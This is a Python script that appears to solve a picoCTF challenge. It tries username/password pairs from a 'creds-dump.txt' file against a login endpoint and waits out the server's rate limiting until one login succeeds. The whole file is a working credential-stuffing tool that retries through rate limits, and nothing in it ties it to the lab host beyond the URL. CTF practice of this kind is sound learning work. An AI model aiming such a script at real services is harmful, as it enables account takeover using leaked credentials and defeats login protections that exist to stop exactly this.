import requests
import time

TARGET_URL = "http://candy-mountain.picoctf.net:55978/login"
CREDS_FILE = "creds-dump.txt"

def exploit():
    session = requests.Session()

    try:
        with open(CREDS_FILE, "r") as file:
            credentials = file.read().splitlines()
    except FileNotFoundError:
        print(f"File not found")
        return

    for cred in credentials:
        if not cred.strip():
            continue

        username, password = cred.split(";")

        while True: 
            print(f"Trying {username}:{password}...")
            
            response = session.post(
                TARGET_URL,
                data={"username": username, "password": password}
            )

            
            if "Rate Limited Exceeded" in response.text:
                print('Rate limit hit, wait for 30 seconds...')
                time.sleep(31)
                continue 
            
            if "Invalid username or password" in response.text:
                break 

            print(f"\nSUCCESS! Logged in with {username}:{password}")
                    
            print(response.text)
            return

    print("\n[-] Finished trying all credentials.")

if __name__ == "__main__":
    exploit()